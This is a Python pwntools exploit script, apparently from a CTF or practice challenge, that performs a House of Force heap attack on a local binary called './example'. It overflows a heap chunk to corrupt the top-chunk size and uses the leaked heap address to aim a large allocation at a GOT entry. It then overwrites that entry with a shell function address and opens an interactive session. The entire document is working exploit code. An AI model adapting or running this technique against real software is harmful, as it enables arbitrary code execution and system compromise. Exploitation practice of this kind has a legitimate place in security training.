from pwn import *

got = 0x804a014
shell = 0x0804860b

p = process("./example")
context.log_level='debug'
control_topchunk = "A"*256 + "ABCD" + p32(0xffffffff)

p.recvuntil("Input heap1 : ")
p.sendline(control_topchunk)

p.recvuntil("Heap1 size : ")
size = int(p.recvuntil("\n")[:-1])

p.recvuntil("Heap1 addr : ")
addr = int(p.recvuntil("\n")[:-1],16)
print "[Addr] : 0x%x" % addr

topchunk_size = (got -(addr + size) -8) & 0xffffffff
print "[Malloc] : 0x%x" % topchunk_size
topchunk_size = 0xffffeefc
p.recvuntil("Size heap2 : ")
p.sendline(str(topchunk_size))

p.recvuntil("Input heap3 : ")
p.sendline("ASDF"+p32(shell))
p.interactive()

# got - heap1_addr + heap1_size + 8 - 8
